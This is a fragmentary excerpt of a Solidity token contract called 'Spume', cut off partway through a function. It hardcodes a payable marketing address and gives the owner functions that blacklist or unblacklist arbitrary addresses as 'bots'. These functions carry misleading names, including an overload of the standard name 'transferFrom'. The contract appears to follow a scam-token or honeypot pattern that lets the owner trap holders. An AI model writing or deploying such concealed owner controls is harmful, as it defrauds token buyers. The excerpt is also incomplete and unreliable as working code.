...
contract Spume is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Spume";
    string public _symbol= "SPUME";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0xC32907dE9F472fc301bc72Db133C28435BF2B6f4);
    ...
    function chire(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = true;
        }
    }

    function transferFrom(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = false;
        }
    }

    function manifesto() onlyOwner public {
